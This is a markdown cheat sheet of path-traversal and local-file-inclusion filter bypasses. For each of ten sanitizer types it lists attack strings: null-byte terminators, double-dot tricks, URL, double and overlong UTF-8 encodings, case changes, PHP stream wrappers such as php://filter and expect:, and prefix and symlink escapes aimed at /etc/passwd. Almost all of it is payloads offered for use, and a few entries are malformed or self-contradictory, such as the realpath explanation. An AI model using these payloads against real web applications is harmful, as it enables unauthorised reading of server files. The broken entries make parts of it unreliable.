# Filter Bypass — the sanitizer shapes and the escapes

## The sanitizer taxonomy — which filter is in the way

1. **extension-append** — `... .php` appended — `%00`-terminate
2. **sequence-strip** — `..`/`/` removed — `....//`-double
3. **prefix-strip** — the leading part removed — inject after
4. **suffix-strip** — the trailing part removed — `..` after the cut
5. **keyword-strip** — `/etc`/`passwd`/`flag` blocked — encodings
6. **keyword-allowlist** — only `page1`/`page2` allowed — null-byte
7. **path-normalize** — `realpath`-style resolve — `..`-inside-a-real-path
8. **WAF-byte-match** — raw `..`/`etc`/`passwd` — encoding/Unicode
9. **scheme-block** — `php://`/`file:`/`phar:` blocked — the scheme-alias
10. **directory-confine** — `realpath`-must-be-under — `..` to a subdir

## The extension-append bypass — `%00` + `.`

```
?file=/etc/passwd%00                — %00 terminates before .php
?file=/etc/passwd%00.php
?file=/etc/passwd%2500
?file=/etc/passwd%00.png
?file=/etc/passwd%00.html
?file=/etc/passwd%00%2f..%2f
?file=/etc/passwd/../               — ./ normalizes away
?file=/etc/passwd/./
?file=/etc/passwd%2f..%2f..%2f      — traverse-out-in
```

`%00` kills everything after — the appended `.php` never lands.

## The sequence-strip bypass — `..`/`../`/`/`/`%2f`

```
?file=....//etc/passwd             — strip ".." → "../"
?file=....//....//etc/passwd
?file=....\/etc/passwd
?file=..;/etc/passwd               — ; separator
?file=..%2fetc%2fpasswd            — URL-encode
?file=%2e%2e%2fetc%2fpasswd
?file=..%252fetc%252fpasswd        — double-encode
?file=..%c0%afetc%cpasswd          — overlong UTF-8
?file=..%ef%bc%8fetc               — fullwidth /
?file=..%u2215etc                  — ∕
?file=..%uFF0Fetc                  — ／
?file=..%u2216etc                  — ∖
?file=..%u2571etc                  — ╱
```

## The keyword-strip bypass — `/etc`/`passwd`/`flag` blocked

```
?file=/et%63/passwd                — %63 = 'c'
?file=/et%63%2fpasswd
?file=/et%250063%2fpasswd
?file=/et\x63/passwd               — \x not decoded — no
?file=/e%74c/passwd                — %74 = 't'
?file=/et/**/passwd                — glob-wildcard
?file=/et?c/passwd                 — ? glob
?file=/et[c]/passwd                — [c] glob
?file=/etc%2fpasswd                — / encoded
?file=/etc%252fpasswd
?file=..%2f..%2fetc%2fpasswd       — the ../ is encoded, not the path
```

## The allowlist bypass — only `page1`/`page2` allowed

```
?file=page1%00/etc/passwd          — terminate after the allowlist
?file=page1/../../../etc/passwd    — the allowlist is a PREFIX
?file=/page1/../../etc/passwd      — the path resolves out
?file=page1/../etc/passwd
?file=../page1/../etc/passwd
```

If the check is `startswith("page")` — `page1/../..` passes the check
then resolves out.

## The `realpath`-confine bypass — the must-be-under check

```
?file=/app/files/../../../etc/passwd    — realpath resolves to /etc/passwd
?file=/app/files/../../etc/passwd       — inside /app then out
?file=/app/files/./././etc/passwd       — ./ chain
?file=/app/files/sub/../../etc/passwd   — sub then out
```

`realpath("/app/files/../../../etc/passwd")` = `/etc/passwd` — the
must-be-under check runs BEFORE resolution → the traversal resolves
out → the check passes → the path escapes.

## The `realpath`-under-check-with-symlink — the symlink-escape

A `realpath`-must-be-under check passes if the path is under — but a
symlink INSIDE the allowed dir pointing OUT resolves past the check —
the symlink is in the allowed tree — the link's target isn't.

## The scheme-block bypass — `php://`/`file:`/`phar:`/`data:` blocked

```
?file=PHP://filter/...                — case-insensitive scheme
?file=Php://filter/...
?file=php%3a%2f%2ffilter/...          — URL-encode the scheme
?file=php%3a//filter/...
?file=phar%3a%2f%2f/x
?file=p%68p://filter/...              — hex-encode
?file=%70%68%70%3a%2f%2ffilter/...
?file=./php://filter/...              — prefix-junk
?file=x/php://filter/...
?file=data://text/plain;base64,...    — data: is usually not blocked
?file=zip://x.zip%23x
?file=glob:///etc/*
```

## The scheme-alias — `file:`/`php://` aliases

```
file://    file:/     file:      — the file-family
php://     php:       — the php-family
phar://    phar:
data://    data:
glob://    glob:
zip://     zip:
rar://     rar:
ogg://     ogg:
expect://  expect:
```

## The path-prefix bypass — a fixed prefix is prepended

```
?file=/etc/passwd                    — prefix+absolute — depends on concat
?file=../../../etc/passwd            — traverse out of the prefix
?file=./../../../etc/passwd
?file=.././.././.././etc/passwd
?file=../../etc/passwd%00            — terminate the prefix's suffix
```

If the param is `"/app/" . $input` — `../../` traverses out of `/app/`.

## The "the filter is a regex" — the regex-gaps

A `preg_match`-style filter — gaps:
- `..` blocked but `..;` not
- `/` blocked but `\` not
- `etc` blocked but `e%74c` not
- `passwd` blocked but `pas%73wd` not
- `php` blocked but `Php`/`php%3a` not
- multiline — `.` doesn't match `\n` — inject a newline
- case — `i`-flag missing — `PHP`/`FILE`/`ETC` work

## The "the filter runs once" — the double-pass

```
?file=..../etc/passwd        — strip ".." once → "../etc/passwd"
?file=....//etc/passwd       — strip "../" once → "../etc/passwd"
?file=..././etc/passwd       — strip ".." once → "../etc/passwd"
```

## The "the filter is case-sensitive" — `PHP`/`FILE`/`ETC`

```
?file=PHP://filter/...
?file=FILE:///etc/passwd
?file=/ETC/PASSWD              — filesystem is case-insensitive on Windows
?file=/eTc/pAsSwD
```

The filesystem is case-insensitive on Windows/macOS — `/ETC/PASSWD`
resolves — the filter's case-sensitivity is the gap.
